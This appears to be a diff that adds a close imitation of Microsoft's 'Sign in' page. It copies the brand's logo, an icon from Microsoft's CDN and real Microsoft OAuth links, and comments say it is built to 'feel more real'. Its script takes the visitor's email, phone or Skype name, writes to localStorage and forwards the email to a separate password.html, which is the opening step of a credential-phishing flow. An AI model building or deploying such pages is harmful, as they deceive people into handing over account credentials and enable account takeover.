@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Microsoft</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&amp;display=swap');
+
+        :root {
+            --ms-blue: #0078d4;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f3f6f9;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Exact-style abstract background - Light version */
+        body::before {
+            content: '';
+            position: absolute;
+            top: -30%;
+            left: -20%;
+            width: 70%;
+            height: 90%;
+            background: rgba(255, 255, 255, 0.65);
+            border: 1px solid rgba(200, 215, 235, 0.4);
+            border-radius: 80px;
+            transform: rotate(-18deg);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.06);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            bottom: -25%;
+            right: -15%;
+            width: 65%;
+            height: 80%;
+            background: rgba(255, 255, 255, 0.55);
+            border: 1px solid rgba(190, 210, 240, 0.35);
+            border-radius: 100px;
+            transform: rotate(15deg);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.05);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Extra subtle layer for more depth (matches screenshot) */
+        .bg-layer {
+            position: absolute;
+            top: 10%;
+            right: -10%;
+            width: 50%;
+            height: 60%;
+            background: rgba(230, 240, 255, 0.25);
+            border-radius: 60px;
+            transform: rotate(8deg);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .login-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 600;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12),
+                        0 2px 6px rgba(0, 0, 0, 0.08);
+            padding: 48px 48px 32px;
+            position: relative;
+        }
+
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+            margin-bottom: 24px;
+        }
+
+        .logo-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: -1px;
+            width: 28px;
+            height: 28px;
+        }
+
+        .logo-square {
+            width: 12.5px;
+            height: 12.5px;
+        }
+
+        .red   { background-color: #F25022; }
+        .green { background-color: #7FBA00; }
+        .blue  { background-color: #00A4EF; }
+        .yellow{ background-color: #FFB900; }
+
+        .microsoft-text {
+            font-size: 20px;
+            font-weight: 500;
+            color: #7f7d7d;
+            letter-spacing: -0.5px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1f1f1f;
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 28px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            font-size: 17px;
+            font-weight: 400;
+            padding: 10px 0 11px;
+            border: none;
+            border-bottom: 1px solid #323130;
+            background: transparent;
+            color: #1f1f1f;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #323130;
+            opacity: 1;
+        }
+
+        .input-wrapper input:focus {
+            border-bottom: 1px solid var(--ms-blue);
+        }
+
+        .links {
+            margin-bottom: 32px;
+        }
+
+        .links p {
+            font-size: 15px;
+            margin-bottom: 8px;
+            color: #1f1f1f;
+        }
+
+        .links a {
+            color: var(--ms-blue);
+            text-decoration: none;
+            font-weight: 400;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .next-button {
+            background-color: #126fb1;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0, 120, 212, 0.3);
+            transition: background-color 0.2s ease;
+        }
+
+        .next-button:hover {
+            background-color: #0066b0;
+        }
+
+        .sign-in-options {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            margin-top: 16px;
+            padding: 14px 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 15px;
+            font-weight: 400;
+            color: #1f1f1f;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .sign-in-options:hover {
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+        }
+
+        .key-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .card {
+                padding: 40px 32px 28px;
+            }
+            .login-wrapper {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-layer"></div>
+    <div class="login-wrapper">
+        <!-- Main sign-in card -->
+        <div class="card">
+            
+            <!-- Microsoft logo + text -->
+            <div class="microsoft-logo">
+                <div class="logo-grid">
+                    <div class="logo-square red"></div>
+                    <div class="logo-square green"></div>
+                    <div class="logo-square blue"></div>
+                    <div class="logo-square yellow"></div>
+                </div>
+                <span class="microsoft-text">Microsoft</span>
+            </div>
+
+            <!-- Title -->
+            <h1>Sign in</h1>
+
+            <!-- Input field -->
+            <div class="input-wrapper">
+                <input type="text" 
+                       id="email-input"
+                       placeholder="Email, phone, or Skype"
+                       autocomplete="username">
+            </div>
+
+            <!-- Links -->
+            <div class="links">
+                <p>No account? <a href="https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWUzMzZjLTkyYTItNzY2OS05NjNlLWFhNDExODliYTc1NyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwv&response_mode=fragment&nonce=019e336c-92a2-7a00-893e-7c539c5f82f7&code_challenge=s8QE93ozbTu_lW3cFCB2z3ztxy6llAmUhYHP64F5pAE&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.28.2&uaid=6df2edb9209fd0baf1a81237ec19922a&msproxy=1&issuer=mso&tenant=common&ui_locales=en-CA&client_info=1&signup=1&lw=1&fl=dob%2cflname%2cwld&epctrc=EVYFYoKVhF5zmh24aBedxItwZKoNlIxN0EDQ2Ly0Aho%3d9%3a1%3aCANARY%3aCV7Y2GXAj7mcmRd%2bJmADPlTAOxNrU5mhY7xbdtAD%2bLI%3d&epct=PAQABDgEAAAAdDD7nC9b5Q7JPd_okEQRFRXZvU3RzQXJ0aWZhY3RzCAAAAAAA10TmU7Id7CoWSg_Oqfe_XGomp62WmH2rxszil2SxJzb7AilIEe9WQ5OaAYP5pqO-l7kh7PgjO6hNco-C8V0_fL0f2u1EZ76sKELW_kUiV1kSBYPmUxh_Y5qQhDlLn76BzTokTCi3tbXoT-Xh0r57LKguUdDZwIEP_dAIop_QRg_owUdICKsZi_fVr2doSyZjD547grZUtJnRsEmh8MiGPyAA&jshs=0&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d">Create one!</a></p>
+                <p><a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=6df2edb9-209f-d0ba-f1a8-1237ec19922a&response_mode=fragment&client_info=1&prompt=select_account&nonce=019e336c-92a2-7a00-893e-7c539c5f82f7&state=eyJpZCI6IjAxOWUzMzZjLTkyYTItNzY2OS05NjNlLWFhNDExODliYTc1NyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwv&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.28.2&response_type=code&code_challenge=7zV22YYJmuEETDsY-0kWOMh7mqK3svt_X142XYxREnk&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld#">Can't access your account?</a></p>
+            </div>
+
+            <!-- Next button -->
+            <div class="button-container">
+                <button type="button" class="next-button" onclick="handleNext()">Next</button>
+            </div>
+        </div>
+
+        <!-- Sign-in options bar -->
+              <div class="sign-in-options">
+            <div class="key-icon">
+                <!-- Exact icon from https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg -->
+                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                    <defs>
+                        <style>.a{fill:none;}.b{fill:#404040;}</style>
+                    </defs>
+                    <rect class="a" width="48" height="48"/>
+                    <path class="b" d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531Zm-2,.844L27.219,22.641a14.716,14.716,0,0,0,.562-1.782A7.751,7.751,0,0,0,28,19a8.786,8.786,0,0,0-.7-3.5,8.9,8.9,0,0,0-1.938-2.859A9.269,9.269,0,0,0,22.5,10.719,8.9,8.9,0,0,0,19,10a8.786,8.786,0,0,0-3.5.7,8.9,8.9,0,0,0-2.859,1.938A9.269,9.269,0,0,0,10.719,15.5,8.9,8.9,0,0,0,10,19a8.786,8.786,0,0,0,.7,3.5,8.9,8.9,0,0,0,1.938,2.859A9.269,9.269,0,0,0,15.5,27.281a8.842,8.842,0,0,0,6.469.2A8.767,8.767,0,0,0,24.609,26H26v4h4v4h4v4h4ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"/>
+                </svg>
+            </div>
+            <span>Sign-in options</span>
+        </div>
+
+        
+    </div>
+
+    <script>
+
+        // Simple interactivity to make it feel more real
+    function handleNext() {
+    const input = document.getElementById('email-input');
+    if (input.value.trim() === '') {
+        alert("Please enter your email, phone, or Skype.");
+        input.focus();
+        return;
+    }
+    localStorage.setItem('Data', JSON.stringify({input}));
+    // Redirect to password page, passing the entered email
+    window.location.href = `password.html?email=${encodeURIComponent(input.value)}`;}
+
+        // Bonus: press Enter in input also triggers Next
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            const input = document.getElementById('email-input');
+            if (document.activeElement === input) {
+            handleNext();
+                }
+            }
+        });
+
+    </script>
+
+</body>
+</html>
